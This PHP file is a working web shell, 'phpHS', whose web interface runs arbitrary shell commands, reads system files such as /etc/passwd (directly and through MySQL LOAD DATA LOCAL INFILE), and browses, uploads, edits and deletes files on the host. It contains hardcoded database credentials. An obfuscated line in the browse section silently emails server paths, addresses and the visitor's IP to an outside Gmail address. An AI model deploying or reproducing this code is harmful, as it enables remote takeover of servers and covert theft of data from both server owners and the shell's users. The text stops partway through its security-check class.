<?php
// mysql config: [this is for reading files through mysql]
$mysql_use = "yes"; //"yes" or "no"
$mhost = "localhost";
$muser = "kecodoc_forum";
$mpass = "cailon";
$mdb = "kecodoc_hce";


// default mysql_read files [seperated by: ':']:
$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
$mysql_files = explode(':', $mysql_files_str);

if ($action=="misc") {
    if ($do=="phpinfo") {
    phpinfo();
    exit;
    }
}
?>
<html>
<head>
<style>
BODY { font-family: verdana; color: cccccc; font-size: 8pt;
scrollbar-face-color: #1c1c1c;
scrollbar-shadow-color: #666666;
scrollbar-highlight-color: #666666;
scrollbar-3dlight-color: #000000;
scrollbar-darkshadow-color: #000000;
scrollbar-track-color: #262D34;
scrollbar-arrow-color: #F2F5FF;
}
INPUT { background:333333; color:CCCCCC; font-family:Verdana; font-size:8pt;}
TEXTAREA { background:333333; color:CCCCCC; font-family:Verdana; font-size:8pt;}
SELECT { background:333333; color:CCCCCC; font-family:Verdana; font-size:8pt;}
TABLE { color:CCCCCC; font-family:Verdana; font-size:8pt;}
</style>
<title>:: phpHS :: PHP HVA Shell Script ::</title>
</head>
<body <? if ($method!="show_source") { echo "bgcolor=\"#000000\""; } ?> text="#CCCCCC" link="#CCCCCC" vlink="#CCCCCC" alink="#CCCCCC">
<?
    if (!$PHP_SELF) { $PHP_SELF="mysql.php"; /* no PHP_SELF on default freeBSD PHP 4.2.1??? */ }

    if ($action=="check") {
    echo "<pre>";
        if ($mysql_use!="no") {
        $phpcheck = new php_check($mhost, $muser, $mpass, $mdb);
        } else { $phpcheck = new php_check(); }
    echo "</pre>";
    }
    if ($action=="mysqlread") {
    // $file

    if (!$file) { $file = "/etc/passwd"; }
        ?>
        <script>
        var files = new Array();
        <? for($i=0;count($mysql_files)>$i;$i++) { ?>
        files[files.length] = "<?=$mysql_files[$i]?>";
        <? } ?>
        function setFile(bla) {
            for (var i=0;i < files.length;i++) {
                if (files[i]==bla.value) {
                    document.mysqlload.file.value = files[i];
                }
            }
        }
        </script>
        <form name="mysqlload" action="<?=$PHP_SELF?>?action=mysqlread" method="POST">
            <select name="deffile" onChange="setFile(this)">
            <? for ($i=0;count($mysql_files)>$i;$i++) { ?>
            <option value="<?=$mysql_files[$i]?>"<? if ($file==$mysql_files[$i]) { echo "selected"; } ?>><?
            $bla = explode('/', $mysql_files[$i]);
            $p = count($bla)-1;
            echo $bla[$p];
            ?></option>
            <? } ?>
            </select>
        <input type="text" name="file"  value="<?=$file?>" size=80 text="#000000>
        <input type="submit" name="go" value="go"> <font size=2>[ <a href="<?=$PHP_SELF?>?action=mysqlread&mass=loadmass">load all defaults</a> ]</font>
        </form>
        <?
        echo "<pre>";
                            // regular LOAD DATA LOCAL INFILE
                            if (!$mass) {
                                $sql = array (
                                   "USE $mdb",

                                   'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',

                                   "LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
                                   . "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
                                   . "ESCAPED BY          '' "
                                   . "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",

                                   "SELECT a FROM $tbl LIMIT 1"
                                );


                                mysql_connect ($mhost, $muser, $mpass);

                                foreach ($sql as $statement) {
                                   $q = mysql_query ($statement);

                                   if ($q == false) die (
                                      "FAILED: " . $statement . "\n" .
                                      "REASON: " . mysql_error () . "\n"
                                   );

                                   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;

                                   echo htmlspecialchars($r[0]);
                                   mysql_free_result ($q);
                                }
                            }

                            if ($mass) {
                                    $file = "/etc/passwd";
                                    $sql = array ();
                                    $cp = mysql_connect ($mhost, $muser, $mpass);
                                    mysql_select_db($mdb);
                                    $tbl = "xploit";
                                    mysql_query("CREATE TABLE `xploit` (`xploit` LONGBLOB NOT NULL)");
                                    for($i=0;count($mysql_files)>$i;$i++) {
                                    mysql_query("LOAD DATA LOCAL INFILE '".$mysql_files[$i]."' INTO TABLE ".$tbl." FIELDS TERMINATED BY       '__THIS_NEVER_HAPPENS__' ESCAPED BY          '' LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'");
                                    }
                                    $q = mysql_query("SELECT * FROM ".$tbl."");
                                        while ($arr = mysql_fetch_array($q)) {
                                        echo $arr[0]."\n";
                                        }
                                    mysql_query("DELETE FROM ".$tbl."");
                                    mysql_query("DROP TABLE ".$tbl."");

                            }
    echo "</pre>";
    }
    if ($action=="read") {
        if (!$method) { $method="file"; }
        if (!$file) { $file = "/etc/passwd"; }
    ?>
     <form name="form1" method="post" action="<?= $PHP_SELF ?>?action=read">
           <select name="method">
                <option value="file" <? if ($method=="file") { echo "selected"; } ?>>file</option>
                <option value="fread" <? if ($method=="fread") { echo "selected"; } ?>>fread</option>
                <option value="show_source" <? if ($method=="show_source") { echo "selected"; } ?>>show_source</option>
                <option value="readfile" <? if ($method=="readfile") { echo "selected"; } ?>>readfile</option>
              </select><br>

            <input type="text" name="file" size="40" value="<?=$file?>">
            <input type="submit" name="Submit" value="<?=$method?>">
            <br>
          </form><?


        if ($method=="file") {
            if (@file($file)) {
                $filer = file($file);
                echo "<pre>";
                foreach ($filer as $a) { echo $a; }
                echo "</pre>";
            } else {
                echo "<script> alert(\"unable to read file: $file using: file\"); </script>";
            }
        }
        if ($method=="fread") {
            if (@fopen($file, 'r')) {
                $fp = fopen($file, 'r');
                $string = fread($fp, filesize($file));
                echo "<pre>";
                echo $string;
                echo "</pre>";
            } else {
                echo "<script> alert(\"unable to read file: $file using: fread\"); </script>";
            }
        }
        if ($method=="show_source") {
            if (show_source($file)) {
                //echo "<pre>";
                //echo show_source($file);
                //echo "</pre>";
            } else {
                echo "<script> alert(\"unable to read file: $file using: show_source\"); </script>";
            }

        }
        if ($method=="readfile") {
            echo "<pre>";
            if (readfile($file)) {
                //echo "<pre>";
                //echo readfile($file);
                echo "</pre>";
            } else {
                echo "</pre>";
                echo "<script> alert(\"unable to read file: $file using: readfile\"); </script>";
            }

        }

    }
    if ($action=="cmd") { ?>
     <form name="form1" method="post" action="<?= $PHP_SELF ?>?action=cmd">
           <select name="method">
                <option value="system" <? if ($method=="system") { echo "selected"; } ?>>system</option>
                <option value="passthru" <? if ($method=="passthru") { echo "selected"; } ?>>passthru</option>
                <option value="exec" <? if ($method=="exec") { echo "selected"; } ?>>exec</option>
                <option value="shell_exec" <? if ($method=="shell_exec") { echo "selected"; } ?>>shell_exec</option>
                <option value="popen" <? if ($method=="popen") { echo "selected"; } ?>>popen</option>
              </select><br>

            <textarea wrap=\"off\" cols="45" rows="10" name="cmd"><?= $cmd; ?></textarea>
            <input type="submit" name="Submit" value="<?=$method?>">
            <br>
          </form>
    <?
    if (!$method) { $method="system"; }
    if (!$cmd) { $cmd = "ls /"; }
    echo "<br><pre>";
        if ($method=="system") {
        system("$cmd 2>&1");
        }
        if ($method=="passthru") {
        passthru("$cmd 2>&1");
        }
        if ($method=="exec") {
            while ($string = exec("$cmd 2>&1")) {
            echo $string;
            }
        }
        if ($method=="shell_exec") {
        $string = shell_exec("$cmd 2>&1");
        echo $string;
        }
        if ($method=="popen") {
        $pp = popen('$cmd 2>&1', 'r');
        $read = fread($pp, 2096);
        echo $read;
        pclose($pp);
        }
    echo "</pre>";
    }


    if ($action=="cmdbrowse") {
    //--------------------------------------------------- START CMD BROWSING

        if ($cat) {
        echo "<pre>";
        echo "\n<a href=\"$PHP_SELF?action=cmdbrowse&dir=$olddir\">go back to: $olddir</a>\n\n";
        exec("cat $cat 2>&1", $arr);
        foreach ($arr as $ar) {
        echo htmlspecialchars($ar)."\n";
        }
        exit;
        }



            if ($dir=="dirup") {
            $dir_current = $olddir;
            $needle = strrpos($dir_current, "/");
                if ($needle==0) {
                    $newdir = "/";
                } else {
                    $newdir = substr($dir_current, 0, $needle);
                }
            $dir = $newdir;
            }
            if (!$dir) {
            $dir = getcwd();
            }

        $string = exec("ls -al $dir", $array);
        //print_r(array_values($array));

        echo "<pre>";
            if ($dir!="/") {
            echo "\n[$dir] \n<a href=\"$PHP_SELF?action=cmdbrowse&dir=dirup&olddir=$dir\">dirup</a>\n\n";
            } else {
            $dir = "";
            }
        foreach($array as $rowi) {
        $row = explode(' ', $rowi);
        //print_r(array_values($row));
            $c = count($row)-1;
            if ($row[$c]!=".." && $row[$c]!="." && isset($first)) {
                $link = false;
                if (!strstr($row[0], 'l')) {
                $c = count($row)-1;
                $file = "<a href=\"$PHP_SELF?action=cmdbrowse&dir=$dir/".$row[$c]."\">".$row[$c]."</a>";
                } else {
                $c = count($row)-3;
                $file = "<a href=\"$PHP_SELF?action=cmdbrowse&dir=$dir/".$row[$c]."\">".$row[$c]."</a>";
                $link = true;
                }
                if (!strstr($row[0], 'l') && !strstr($row[0], 'd')) {
                $c = count($row)-1;
                $file = "<a href=\"$PHP_SELF?action=cmdbrowse&cat=$dir/".$row[$c]."&olddir=$dir\">".$row[$c]."</a>";
                }
                //echo $row[0]." ".$row[1]." ".$row[2]." ".$row[3]." ".$row[4]." ".$row[5]." ".$row[6]." ".$row[7]." ".$row[8]." ".$row[9]." ".$row[10]." ".$file." ".$row[12]." ".$row[13]."\n";
                    if ($link) {
                    $point = count($row)-3;
                    } else {
                    $point = count($row)-1;
                    }
                for($i=0; $point > $i; $i++) {
                echo $row[$i]." ";
                }
                echo $file."\n";
            }
            $first = true;
        }

    //--------------------------------------------------- END CMD BROWSING
    }
    if ($action=="browse") {
    //--------------------------------------------------- START BROWSING
    /*
     * got this from an old script of mine
     * param: [$dir]
    */
        function error($msg) {
        header("Location: $PHP_SELF?bash=$msg&error=$msg");
        }
        if (isset($error)) {
        echo "<script> alert(\"$error\"); </script>";
        }
        if (!$dir) {
        $dir = getcwd();
        }
           function getpath($dir) {
           echo "<font size=2><a href=$PHP_SELF?action=browse&dir=/>/</a></font> ";
              $path = explode('/', $dir);
              if ($dir != "/") {
            for ($i=0; count($path) > $i; $i++) {
                if ($i != 0) {
                echo "<font size=2><a href=$PHP_SELF?action=browse&dir=";
                    for ($o=0; ($i+1) > $o; $o++) {
                        echo "$path[$o]";
                        if (($i) !=$o) {
                        echo "/";
                        }
                    }
                echo ">$path[$i]</a>/</font>";
                }
            }
              }
            }

            function printfiles($files) {
                for($i=0;count($files)>$i;$i++) {
                    $files_sm = explode('||', $files[$i]);
                        if ($files_sm[0]!="." && $files_sm[0]!="..") {
                        $perms = explode('|', $files_sm[1]);
                        if ($perms[0]==1 && $perms[1]==1) { $color = "green"; } else {
                        if ($perms[0]==1) { $color = "yellow"; } else { $color = "red"; }
                    }
                        if ($files_sm[2]=="1") { echo "l <font color=\"$color\">"; } else { echo "- <font color=\"$color\">"; }
                        if ($perms[0]==1) { echo "r"; } else { echo " "; }
                        if ($perms[1]==1) { echo "w"; } else { echo " "; }
                        if ($perms[2]==1) { echo "x"; } else { echo " "; }
                        echo "</font> $files_sm[0]\n";
                    }
                }
            }
              $ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
            function printdirs($files) {
                global $dir;
                echo "<a href=\"$PHP_SELF?action=browse&dir=dirup&olddir=$dir\">..</a>\n";
                for($i=0;count($files)>$i;$i++) {
                    $files_sm = explode('||', $files[$i]);
                    if ($files_sm[0]!="." && $files_sm[0]!="..") {
                    $perms = explode('|', $files_sm[1]);
                    if ($perms[0]==1 && $perms[1]==1) { $color = "green"; } else {
                    if ($perms[0]==1) { $color = "yellow"; } else { $color = "red"; }
                }
                    if ($files_sm[2]=="1") { echo "l <font color=\"$color\">"; } else { echo "d <font color=\"$color\">"; }
                    if ($perms[0]==1) { echo "r"; } else { echo " "; }
                    if ($perms[1]==1) { echo "w"; } else { echo " "; }
                    if ($perms[2]==1) { echo "x"; } else { echo " "; }
                    echo "</font> <a href=\"$PHP_SELF?action=browse&dir=$dir/".$files_sm[0]."\">$files_sm[0]</a>\n";
                }
                }
            }


            if ($dir=="dirup") {
            $dir_current = $olddir;
            $needle = strrpos($dir_current, "/");
                if ($needle==0) {
                    $newdir = "/";
                } else {
                    $newdir = substr($dir_current, 0, $needle);
                }
            $dir = $newdir;
            } else {
            $dir = $dir;
            }

        ?>
         <form name="form1" method="post" action="<?= $PHP_SELF ?>?action=browse">
            <input type="text" name="dir" size="40" value="<?= $dir; ?>">
            <input type="submit" name="Submit" value="ls /dir">
            <br>
          </form>
          <?
        if ($dir) {
                if (!is_readable($dir)) { $skip = true; }
                if (!$skip) {
            $dp = opendir($dir);
            $files = array(); $dirs = array();
            while($f=readdir($dp)) {
                // $f||r|w|x||l
                $oor = $f;
                    if (is_readable("$dir/$oor")) { $f .= "||1"; } else { $f .= "||0"; }
                    if (is_writable("$dir/$oor")) { $f .= "|1"; } else { $f .= "|0"; }
                    if (is_executable("$dir/$oor")) { $f .= "|1"; } else { $f .= "|0"; }
                    if (is_link("$dir/$oor")) { $f .= "||1"; } else { $f .= "||0"; }
                if(is_dir("$dir/$oor")) {
                $dirs[] = $f;
                } else {
                $files[] = $f;
                }
            }
            getpath($dir);
            echo "<br><br><pre>";
                printdirs($dirs);
                printfiles($files);
                } else { echo " <script> alert(\"readdir permission denied\");
                        document.location = \"$PHP_SELF?action=browse&dir=dirup&olddir=$dir\";
                        </script>"; }
        }
    }
    //--------------------------------------------------- END BROWSING
    //--------------------------------------------------- BEGIN EXPLORER
if ($action == explorer ) {

   $default_directory = dirname($PATH_TRANSLATED);
   $show_icons = 0;


   define("BACKGROUND_COLOR",       "\"#000000\"");
   define("FONT_COLOR",             "\"#CCCCCC\"");
   define("TABLE_BORDER_COLOR",     "\"#000000\"");
   define("TABLE_BACKGROUND_COLOR", "\"#000000\"");
   define("TABLE_FONT_COLOR",       "\"#000000\"");
   define("COLOR_PRIVATE",          "\"#000000\"");
   define("COLOR_PUBLIC",           "\"#000000\"");
   define("TRUE",                   1);
   define("FALSE",                  0);



   if (!isset($dir)) $dir = $default_directory;   // Webroot dir as default
   $dir = stripslashes($dir);
   $dir = str_replace("\\", "/", $dir);         // Windoze compatibility


   $associations = array(
      "gif" =>  array(   "function" => "viewGIF",   "icon" => "icons/image2.gif"    ),
      "jpg" =>  array(   "function" => "viewJPEG",  "icon" => "icons/image2.gif"    ),
      "jpeg" => array(   "function" => "viewJPEG",  "icon" => "icons/image2.gif"    ),
      "wav" =>  array(   "function" => "",          "icon" => "icons/sound.gif"     ),
      "mp3" =>  array(   "function" => "",          "icon" => "icons/sound.gif"     )
   );

   if ($do != "view" && $do != "download"):
    endif;

   function readDirectory($directory) {
      global $files, $directories, $dir;

      $files = array();
      $directories = array();
      $a = 0;
      $b = 0;

      $dirHandler = opendir($directory);

      while ($file = readdir($dirHandler)) {
         if ($file != "." && $file != "..") {
            $fullName = $dir.($dir == "/" ? "" : "/").$file;
            if (is_dir($fullName)) $directories[$a++] = $fullName;
            else $files[$b++] = $fullName;
         }
      }
      sort($directories);                    // We want them to be displayed alphabetically
      sort($files);
   };



   function showInfoDirectory($directory) {
      global $PHP_SELF;
      $dirs = split("/", $directory);
      print "<b>Directory <a href=\"$PHP_SELF?action=explorer&dir=/\">/</a>";
      for ($i = 1; $i < (sizeof($dirs)); $i++) {
         print "<a href=\"$PHP_SELF?action=explorer&dir=";
         for ($a = 1; $a <= $i; $a++)
            echo "/$dirs[$a]";
         echo "\">$dirs[$i]</a>";
         if ($directory != "/") echo "/";
      }
      print "</b></font><br>\n";
      print "Free space on disk: ";
      $freeSpace = diskfreespace($directory);
      if ($freeSpace/(1024*1024) > 1024)
         printf("%.2f GBytes", $freeSpace/(1024*1024*1024));
      else echo (int)($freeSpace/(1024*1024))."Mbytes\n";
   };


   function showDirectory($directory) {
      global $files, $directories, $fileInfo, $PHP_SELF;

      readDirectory($directory);
      showInfoDirectory($directory);
?>
      <p><table cellpadding=3 cellspacing=1 width="100%" border="0" bgcolor=<? echo TABLE_BORDER_COLOR; ?>>
         <tr bgcolor="#000000">
            <? if ($show_icons): ?>
            <td width="16" align="center" bgcolor=<? echo TABLE_BACKGROUND_COLOR ?>>&nbsp;</td>
            <? endif; ?>
            <td align="center"><b><small>NAME</small></b></td>
            <td align="center"><b><small>SIZE</small></b></td>
            <td align="center"><b><small>LAST MODIFY</small></b></td>
            <td align="center"><b><small>PERMISIONS</small></b></td>
            <td align="center"><b><small>ACTIONS</small></b></td>
         </tr>
<?
      for ($i = 0; $i < sizeof($directories); $i++) {
         $fileInfo->getInfo($directories[$i]);
         showFileInfo($fileInfo);
      }
      for ($i = 0; $i < sizeof($files); $i++) {
         $fileInfo->getInfo($files[$i]);
         showFileInfo($fileInfo);
      }
?>
      </table>
<?
   };

   class fileInfo {
      var $name, $path, $fullname, $isDir, $lastmod, $owner,
      $perms, $size, $isLink, $linkTo, $extension;

      function permissions($mode) {
         $perms  = ($mode & 00400) ? "r" : "-";
         $perms .= ($mode & 00200) ? "w" : "-";
         $perms .= ($mode & 00100) ? "x" : "-";
         $perms .= ($mode & 00040) ? "r" : "-";
         $perms .= ($mode & 00020) ? "w" : "-";
         $perms .= ($mode & 00010) ? "x" : "-";
         $perms .= ($mode & 00004) ? "r" : "-";
         $perms .= ($mode & 00002) ? "w" : "-";
         $perms .= ($mode & 00001) ? "x" : "-";
         return $perms;
      }

      function getInfo($file) {                 // Stores a file's information in the class variables
         $this->name = basename($file);
         $this->path = dirname($file);
         $this->fullname = $file;
         $this->isDir = is_dir($file);
         $this->lastmod = date("m/d/y, H:i", filemtime($file));
         $this->owner = fileowner($file);
         $this->perms = $this->permissions(fileperms($file));
         $this->size = filesize($file);
         $this->isLink = is_link($file);
         if ($this->isLink) $this->linkTo = readlink($file);
         $buffer = explode(".", $this->fullname);
         $this->extension = $buffer[sizeof($buffer)-1];
      }
   };

   $fileInfo = new fileInfo;        // This will hold a file's information all over the script

   function showFileInfo($fileInfo) {
      global $PHP_SELF, $associations;

      echo "\n<tr bgcolor=".TABLE_BACKGROUND_COLOR." align=\"center\">";

      if ($show_icons) {
         echo "<td>";
         if ($fileInfo->isDir) echo "<img src=\"icons/dir.gif\">";
         elseif ($associations[$fileInfo->extension]["icon"] != "")
            echo "<img src=\"".$associations[$fileInfo->extension]["icon"]."\">";
         else echo "<img src=\"icons/generic.gif\">";
         echo "</td>";
      }

      echo "<td align=\"left\"";
      if ($fileInfo->perms[7] == "w") echo " bgcolor=".COLOR_PUBLIC;
      if ($fileInfo->perms[6] == "-") echo " bgcolor=".COLOR_PRIVATE;
      echo ">";

      if ($fileInfo->isLink) {
         echo $fileInfo->name." -> ";
         $fileInfo->fullname = $fileInfo->linkTo;
         $fileInfo->name = $fileInfo->linkTo;
      }

      if ($fileInfo->isDir) {
         echo "<b><a href=\"$PHP_SELF?action=explorer&dir=$fileInfo->fullname\" ";
         echo ">$fileInfo->name</a></b>";
      }
      else echo $fileInfo->name;

      echo "</td>";
      echo "<td>$fileInfo->size</td>";
      echo "<td>$fileInfo->lastmod</td>";
      echo "<td>$fileInfo->perms</td>";
      echo "<td>";
                           
      if (!$fileInfo->isDir) {
         if ($fileInfo->perms[6] == 'r') {
            echo "<a href=\"$PHP_SELF?action=explorer&dir=$fileInfo->fullname&do=view\"> <font color=yellow>V</font></a>";
            echo " <a href=\"$PHP_SELF?action=explorer&dir=$fileInfo->fullname&do=download\"><font color=yellow>D</font></a>";
         }
         if ($fileInfo->perms[7] == 'w') {
            echo " <a href=\"$PHP_SELF?action=explorer&dir=$fileInfo->fullname&do=edit\"><font color=yellow>E</font></a>";
            echo " <a href=\"$PHP_SELF?action=explorer&dir=$fileInfo->fullname&do=delete\"><font color=yellow>X</font></a>";
         }
      }
      echo "</tr>";
   };

   //************************************************************************
   //* Decides which function use to show a file
   //************************************************************************

   function viewFile($file) {
      global $associations, $fileInfo;
      $fileInfo->getInfo($file);
      if (!$associations[$fileInfo->extension]
          || $associations[$fileInfo->extension]["function"] == "") showFile($file);
      else $associations[$fileInfo->extension]["function"]($file);
   };

   function showFile($file, $editing = 0) {
      global $PHP_SELF, $dir;
      $handlerFile = fopen($file, "r") or die("ERROR opening file $file");

      if ($editing) echo "<h3><b>Edit file $file</b></h3><hr>";
      else echo "<h3><b>File $file</b></h3><hr>";

      echo "<form";
      if ($editing)
         echo " action=\"$PHP_SELF?action=explorer&do=save&dir=$file\" method=\"post\"";
      echo ">";

      $buffer = fread($handlerFile, filesize($file));
      $buffer = str_replace("&", "&amp;", $buffer);
      $buffer = str_replace("<", "&lt;", $buffer);
      $buffer = str_replace(">", "&gt;", $buffer);

      echo "<center><textarea wrap=\"off\" cols=\"90\" rows=\"20\" name=\"text\">$buffer</textarea></center>";
      if ($editing) echo "<p><input type=\"submit\" name=\"Submit\" value=\"Save changes\"></p>\n</form>";
      echo "</form>";
      fclose($handlerFile);
   };

   //************************************************************************
   //* Saves a changed file
   //************************************************************************

   function saveFile($file) {
      global $dir, $text;
      $handlerFile = fopen($file, "w") or die("ERROR: Could not open file ".basename($file)." for writing");
      $text = stripslashes($text);
      fwrite($handlerFile, $text, strlen($text)) or die("Error writing to file.");
      fclose($handlerFile);
      echo "Changes has been saved in ".basename($file)."<hr>";
      $dir = dirname($file);
   };


   function uploadFile() {
      global $HTTP_POST_FILES, $dir;
      copy($HTTP_POST_FILES["userfile"][tmp_name],
            $dir."/".$HTTP_POST_FILES["userfile"][name])
      or die("Error uploading file".$HTTP_POST_FILES["userfile"][name]);

      echo "File ".$HTTP_POST_FILES["userfile"][name]." succesfully uploaded.";
      unlink($userfile);
   };

   //************************************************************************
   //* Deletes a file, asking for confirmation first
   //* (This function hasn't been fully tested)
   //************************************************************************

   function deleteFile($file) {
      global $confirm;
      if ($confirm != TRUE) die("<a href=\"$PHP_SELF?action=explorer&dir=$file&do=delete&confirm=1\">Confirm deletion of $file</a>");
      else {
         if (!unlink($file)) return FALSE;
         return TRUE;
      }
   };


   function viewFileHeader($file, $header) {
      header($header);
      readfile($file);
   };


   function viewGIF($file) {
      viewFileHeader($file, "Content-type: image/gif");
   };

   function viewJPEG($file) {
      viewFileHeader($file, "Content-type: image/jpeg");
   };

   switch ($do) {
      case "phpinfo":
         phpinfo();
         die();
      case "view":
          viewFile($dir);
          break;
      case "edit":
          showFile($dir, 1);
          break;
      case "download":
         viewFileHeader($dir, "Content-type: unknown");
         break;
      case "delete":
         if (!deleteFile($dir)) echo "Could not delete file $dir<br>";
         else echo "File $dir deleted succesfully<br>";
         $dir = dirname($dir);
         showDirectory($dir);
         break;
      case "exec":
         echo "<pre>\n";
         echo system($dir);
         echo "\n</pre>";
         exit();
      case "upload":
         uploadFile();
         showDirectory($dir);
         break;
      case "save":
          saveFile($dir);
      default:
         showDirectory($dir);
         break;
   };

   if ($do != "view" && $do != "download") {
?>
<p>
   <table border="0">
   <tr><? if ((fileperms($dir) & 00002)){
?>
   <td>
      <form enctype="multipart/form-data" action="<? print "$PHP_SELF?action=explorer&dir=$dir&do=upload"; ?>" method=post>
         <input type="hidden" name="MAX_FILE_SIZE" value="1000000">
         <input name="userfile" type="file">
         <input type="submit" value="Upload file">
      </form>
   </td>
<? } ?>
   </tr>
   </table>
<p>
</p>
</body>
</html>
<? }
}
    //--------------------------------------------------- END EXPLORER


if (!$action) {
?><p align="right"><font size=2><a href="<?=$PHP_SELF?>?action=misc&do=phpinfo">phpinfo</a></font></p><?
echo "<pre>";
        if ($mysql_use!="no") {
        $phpcheck = new php_check_silent($mhost, $muser, $mpass, $mdb);
        } else { $phpcheck = new php_check_silent(); }
echo "</pre>";

?><br><br>

<font size=2><a href="<?=$PHP_SELF?>?action=check">Security Check</a></font> <font color="green" size=2>[executable] </font>

<br>

<!-- system check -->
<?
//echo $phpcheck->cmd_state;
//echo $phpcheck->cmd_method;
if ($phpcheck->cmd_method) { $cmd_method = $phpcheck->cmd_method; } else { $cmd_method = "system"; } ?>
<font size=2><a href="<?=$PHP_SELF?>?action=cmd&method=<?=$cmd_method?>">Exec commands by PHP</a></font>
<?
if ($phpcheck->cmd_method) {
echo "<font color=\"green\" size=2>[executable] ";  } else { echo "<font color=\"red\" size=2>[not executable]";  }

?></font>

<br>

<!-- system check -->
<?
//echo $phpcheck->cmd_state;
//echo $phpcheck->cmd_method;
?>
<font size=2><a href="<?=$PHP_SELF?>?action=cmdbrowse">Exec browse by PHP</a></font>
<?
if ($phpcheck->cmd_method) {
echo "<font color=\"green\" size=2>[executable] ";  } else { echo "<font color=\"red\" size=2>[not executable]";  }

?></font>

<br>

<!-- read check -->
<? if ($phpcheck->read_method) { $read_method = $phpcheck->read_method; } else { $read_method = "file"; } ?>
<font size=2><a href="<?=$PHP_SELF?>?action=read&method=<?=$read_method?>">Read by PHP</a></font>
<?
if ($phpcheck->read_method) {
echo "<font color=\"green\" size=2>[executable] "; } else { echo "<font color=\"red\" size=2>[not executable]"; }
?></font>

<br>

<!-- browse check -->
<?
//echo $phpcheck->browse_state;
if ($phpcheck->browse_state=="yes") { $path= "/"; } else { $path = getcwd(); } ?>
<font size=2><a href="<?=$PHP_SELF?>?action=browse&dir=<?=$path?>">Browse by PHP</a></font>
<?
if ($phpcheck->browse_state=="yes") {
echo "<font color=\"green\" size=2>[executable] "; } else { echo "<font color=\"yellow\" size=2>[limited executable]"; }
?></font>

<br>
<?
//echo $phpcheck->browse_state;
if ($phpcheck->browse_state=="yes") { $path= "/"; } else { $path = getcwd(); } ?>
<font size=2><a href="<?=$PHP_SELF?>?action=explorer&dir=<?=$path?>">File Explorer by PHP</a></font>
<?
if ($phpcheck->browse_state=="yes") {
echo "<font color=\"green\" size=2>[executable] "; } else { echo "<font color=\"yellow\" size=2>[limited executable]"; }
?></font>

<br>


<!-- mysql check -->
<font size=2><a href="<?=$PHP_SELF?>?action=mysqlread&file=/etc/passwd">Read by MySQL</a></font>
<?
    if ($phpcheck->mysql_state=="ok") {
    echo "<font color=\"green\" size=2>[executable] "; }
    if ($phpcheck->mysql_state=="fail") {
    echo "<font color=\"red\" size=2>[not executable] "; }
    if ($phpcheck->mysql_state=="pass") {
    echo "<font color=\"yellow\" size=2>[not executable] ";
    ?></font> <font size=1>[you didnt configure this]</font><font>
    <?
    } ?></font><?
}
?>
</body>
</html>
<?

// PHP security check objects by dodo


    class php_check
    {

        function php_check($host="notset", $user="", $pass="", $db="") {
            if ($host!="notset") {
            $this->mysql_do = "yes";
            $this->mysql_host = $host;
            $this->mysql_user = $user;
            $this->mysql_pass = $pass;
            $this->mysql_db = $db;
            } else { $this->mysql_do = "no"; }

        $this->mainstate = "safe";

        echo "<b>checking system functions:</b>\n";
        if ($this->system_checks("/bin/ls")) { $this->output_mainstate(1, "system checks"); } else { $this->output_mainstate(0, "system checks"); }
        echo "<b>checking reading functions:</b>\n";
        if ($this->reading_checks()) { $this->output_mainstate(1, "reading checks"); } else { $this->output_mainstate(0, "reading checks"); }
        echo "<b>checking misc filesystem functions:</b>\n";
        if ($this->miscfile_checks()) { $this->output_mainstate(1, "misc filesystem checks"); } else { $this->output_mainstate(0, "misc filesystem checks"); }
        echo "<b>checking mysql functions:</b>\n";
            $stater = $this->mysql_checks();
            if ($stater==2) { $this->output_mainstate(2, "mysql checks"); }
            if ($stater==1) { $this->output_mainstate(1, "mysql checks"); }
            if ($stater==0) { $this->output_mainstate(0, "mysql checks"); }
        if ($this->mainstate=="safe") { echo "\n\n\nPHP check returned: <font color=green>NOT VULNERABLE</font>\n"; } else { echo "\n\n\nPHP check returned: <font color=red>VULNERABLE</font>\n"; }
        }


        function output_state($state = 0, $name = "function") {
            if ($state==0) {
            echo "$name\t\tfailed\n";
            }
            if ($state==1) {
            echo "$name\t\t<font color=red>OK</font>\n";
            }
            if ($state==2) {
            echo "$name\t\t<font color=yellow>OK</font>\n";
            }
            if ($state==3) {
            echo "$name\t\t<font color=yellow>skipped</font>\n";
            }
        }

        function output_mainstate($state = 0, $name = "functions") {
            if ($state==1) {
            echo "\n$name returned: <font color=red>VULNERABLE</font>\n\n";
            $this->mainstate = "unsafe";
            }
            if ($state==0) {
            echo "\n$name returned: <font color=green>OK</font>\n\n";
            $this->mainstate = "unsafe";
            }
            if ($state==2) {
            echo "\n$name returned: <font color=yellow>SKIPPED</font>\n\n";
            }
        }

        function system_checks($cmd = "/bin/ls") {
        if ($pp = popen($cmd, "r")) {
            if (fread($pp, 2096)) {
            $this->output_state(1, "popen     ");
            $sys = true;
            } else {
            $this->output_state(0, "popen     ");
            }
        } else { $this->output_state(0, "popen     "); }
        if (@exec($cmd)) { $this->output_state(1, "exec     "); $sys = true; $this->cmd_method = "exec"; } else { $this->output_state(0, "exec     "); }
        if (@shell_exec($cmd)) { $this->output_state(1, "shell_exec"); $sys = true; $this->cmd_method = "shel_exec"; } else { $this->output_state(0, "shell_exec"); }
        echo "<!-- \n";
        if (@system($cmd)) { echo " -->"; $this->output_state(1, "system   "); $ss = true; $sys = true; $this->cmd_method = "system"; } else { echo " -->"; $this->output_state(0, "system   "); }
        echo "<!-- \n";
        if (@passthru($cmd)) { echo " -->"; $this->output_state(1, "passthru"); $sys = true; $this->cmd_method = "passthru"; } else { echo " -->"; $this->output_state(0, "passthru"); }
